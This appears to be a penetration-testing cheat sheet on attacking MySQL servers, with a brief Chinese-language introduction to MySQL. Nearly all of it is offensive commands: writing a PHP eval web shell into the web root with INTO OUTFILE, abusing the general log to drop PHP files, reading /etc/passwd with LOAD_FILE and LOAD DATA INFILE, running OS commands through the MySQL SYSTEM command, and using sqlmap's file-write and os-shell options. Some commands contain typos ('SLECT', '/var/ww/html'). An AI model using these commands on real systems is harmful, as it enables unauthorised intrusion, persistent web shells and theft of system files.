# MySQL

<details>

<summary>Introduction</summary>

MySQL 是一个开源的关系型数据库管理系统（RDBMS），广泛用于存储和管理结构化数据。它支持多种操作系统，并提供了丰富的功能，如数据存储、检索、修改和删除等。MySQL 采用客户端-服务器架构，其中客户端应用程序通过 SQL（Structured Query Language）与服务器进行交互。MySQL 具有良好的性能、可靠性和可扩展性，并支持事务处理和复制等高级功能。它被广泛应用于 Web 开发、企业应用、电子商务和数据分析等各种场景中，是最流行的关系型数据库之一。

</details>

<table><thead><tr><th width="178">Name</th><th>MySQL</th></tr></thead><tbody><tr><td><strong>Default Port</strong></td><td>3306</td></tr><tr><td><strong>GetShell?</strong></td><td>Yes</td></tr><tr><td><strong>Vulnerability</strong></td><td><ul><li>File Write</li><li>File Read</li><li>Remote Command Execution</li><li>Get Shell</li></ul></td></tr></tbody></table>

## File Write

```bash
# Query the path with write permissions
# if it is empty, it means that it can write to any path
# before MySQL version 5.7 it is empty by default
SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';

# Use the INTO OUTFILE statement
SELECT '<?php @eval($_REQUEST['exec']);?>' INTO OUTFILE '/var/ww/html/phpinfo.php';

# Use the log function
SHOW VARIABLES LIKE '%general%';
SET GLOBAL general_log = "ON";
SET GLOBAL general_log_file="/var/www/html/shell.php";
SLECT '<?php phpinfo(); ?>';

# Use sqlmap
sqlmap -u "URL" --file-write="/LOCAL/PATH/FILE" --file-dest="/REMOTE/PATH/FILE"
```

## File Read

```bash
# LOAD_FILE 语句读取文件
# Use LOAD_FILE segment
SELECT LOAD_FILE( "/etc/passwd" );

# Use LOAD DATA INFILE ... INTO TABLE segment
USE mysql;
LOAD DATA INFILE '/etc/passwd' INTO TABLE user;
SELECT * FROM user;
```

## Remote Command Execution

{% code title="Environment" %}
```bash
HOST=; $USNM=root; $PSWD=root; # TARGET HOST INFO
```
{% endcode %}

```bash
# Use SYSTEM segment (MySQL version 5.x)
mysql -h$HOST -u$USNM -p$PSWD
# IN MySQL CLI
SYSTEM cat /etc/passwd;
```

## GetShell

```bash
# Use sqlmap (you need to know the absolute path of website)
sqlmap -u "URL" --os-shell
```
